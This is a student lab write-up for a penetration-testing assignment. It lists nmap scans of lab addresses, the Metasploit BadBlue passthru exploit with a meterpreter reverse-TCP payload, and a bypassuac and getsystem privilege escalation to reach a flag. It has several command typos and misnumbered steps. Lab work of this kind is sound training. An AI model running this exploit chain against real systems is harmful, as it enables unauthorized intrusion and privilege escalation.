# Assigment 1
For full executive report, see [PWNChallenge2_GabriellaAhn](https://github.com/haein001/CMU_penetration-testing/blob/3355250e0ba7ee6308910f5ad3355f6abd0d73bd/pwnchallenge2/PWNChallenge%232.pdf).

## Step 1

1. Conduct thorough scan of 10.20.160.63 and 10.20.160.112 that are found from inital scan of the scope.
   
    ``
    nmap -A -p- -T5 10.20.160.112
    ``
    
    ``
    nmap -A -p- -T5 10.20.160.63
    ``
    
    Port 8080 was running BadBlue httpd 2.7 from 10.20.160.112. 
    
2. Open Metasploit.

    ``
    msfconsole
    ``
    
3. Since we are going to use _badblue_ to exploit the host, serach Konica. Use the exploit from the search result.

    ``
    search Badblue
    ``
    
    ``
    use exploit/windows/gttp/badblue_passthru
    ``
   
4. Set rhost, rport, and payload.
    
    ``
    set RHOST 10.20.160.112
    ``
    
    ``
    set RPORT 8080
    ``
    
    ``
    set PAYLOAD windows/meterpreter/reverse_tcp
    ``

5. Then, exploit

    ``
    exploit
    ``
    
6. Now you are in the system. Use various command to look for the flag.

    ``
    search -f proof.txt
    ``
    
    But, in Juan's desktop folder, there is no flag. So, we have to escalate the privilege to administer.
    
7. Use bypassuac to escalate the privilege.
- **bypassuac:** is an exploit that are designed to bypass User Access Control.

    ``
    search bypassuac
    ``
    
8. Set the basic information for the exploit.

    ``
    use exploit/windows/local/bypassuac
    ``
    
    ``
    session -i
    ``
    
    ``
    set session 1
    ``
    
    ``
    set payload windows/meterpreter/reverse_tcp
    ``
    
    ``
    exploit
    ``

12. After succesfully logging into the machine, check the username.

    ``
    get uid
    ``
    
    ``
    getsystem
    ``
    
    ``
    get uid
    ``
       
    It will be still Juan, so in order to change to administer you have to use _'getsystem'_ command.
    
13.  Then, use windows command to get the flag.
